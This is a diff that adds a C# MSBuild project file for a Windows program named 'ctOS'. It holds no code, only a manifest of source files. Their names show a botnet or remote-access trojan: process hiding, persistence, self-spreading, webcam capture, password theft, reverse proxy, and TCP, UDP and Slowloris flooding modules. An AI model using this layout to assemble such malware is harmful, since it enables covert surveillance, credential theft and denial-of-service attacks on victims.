@@ -1,0 +1,97 @@
+<?xml version='1.0' encoding='utf-8'?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="Build">
+  <PropertyGroup>
+    <ProjectType>local</ProjectType>
+    <ProjectVersion>7.10.377</ProjectVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>b38114af-9edd-4603-abd0-0c10140aec86</ProjectGuid>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <AssemblyName>ctOS</AssemblyName>
+    <OutputType>WinExe</OutputType>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="Interop.NATUPNPLib" />
+    <Reference Include="DetectDesktop" />
+    <Reference Include="AForge.Video.DirectShow" />
+    <Reference Include="AForge.Video" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="PasswordDLL" />
+    <Compile Include="AssemblyInfo.cs" />
+    <Compile Include="Global.cs" />
+    <Compile Include="Chat\My\MyApplication.cs" />
+    <Compile Include="Chat\My\MyComputer.cs" />
+    <Compile Include="Chat\My\MyProject.cs" />
+    <Compile Include="Chat\Chat.cs" />
+    <Compile Include="Chat\CodecDesktop.cs" />
+    <Compile Include="Chat\Compressione.cs" />
+    <Compile Include="Chat\Data.cs" />
+    <Compile Include="Chat\Serializer.cs" />
+    <Compile Include="Chat\ProtonCrypt.cs" />
+    <Compile Include="Chat\ResourceManager.cs" />
+    <Compile Include="Chat\FileProtector.cs" />
+    <Compile Include="Chat\ProtectionSettings.cs" />
+    <Compile Include="Chat\DownloadAndProtectFiles.cs" />
+    <Compile Include="Chat\Form1.cs" />
+    <Compile Include="Chat\Spread.cs" />
+    <Compile Include="Chat\Funzioni.cs" />
+    <Compile Include="Chat\SoftwareCode.cs" />
+    <Compile Include="Chat\DownloadFromURL.cs" />
+    <Compile Include="Chat\StartUPCode.cs" />
+    <Compile Include="Chat\HardBK.cs" />
+    <Compile Include="Chat\Hide_Process_From_TaskManager.cs" />
+    <Compile Include="Chat\GetItems.cs" />
+    <Compile Include="Chat\IEProxy.cs" />
+    <Compile Include="Chat\My\Resources\Resources.cs" />
+    <Compile Include="Chat\My\MySettings.cs" />
+    <Compile Include="Chat\Persistance.cs" />
+    <Compile Include="Chat\GLobalProxyVar.cs" />
+    <Compile Include="Chat\ReversePRoxy.cs" />
+    <Compile Include="Chat\HTTPSocket.cs" />
+    <Compile Include="Chat\Socketss.cs" />
+    <Compile Include="Chat\BotKillers.cs" />
+    <Compile Include="Chat\SplitFunzioni.cs" />
+    <Compile Include="Chat\CmdLeach.cs" />
+    <Compile Include="Chat\StresserTest.cs" />
+    <Compile Include="Chat\TCPStresser.cs" />
+    <Compile Include="Chat\SlowLorisClass.cs" />
+    <Compile Include="Chat\UDPClass.cs" />
+    <Compile Include="Chat\Torrent.cs" />
+    <Compile Include="Chat\WebCam.cs" />
+    <Compile Include="Chat\Win32.cs" />
+    <Compile Include="Chat\WriteOnScreen.cs" />
+    <EmbeddedResource Include="Chat.Chat.resources" />
+    <EmbeddedResource Include="Chat.DetectDesktop.dll" />
+    <EmbeddedResource Include="Chat.AForge.Video.dll" />
+    <EmbeddedResource Include="Chat.PasswordDLL.dll" />
+    <EmbeddedResource Include="Chat.Form1.resources" />
+    <EmbeddedResource Include="Chat.Interop.NATUPNPLib.dll" />
+    <EmbeddedResource Include="Chat.Resources.resources" />
+    <EmbeddedResource Include="Chat.AForge.Video.DirectShow.dll" />
+  </ItemGroup>
+</Project>
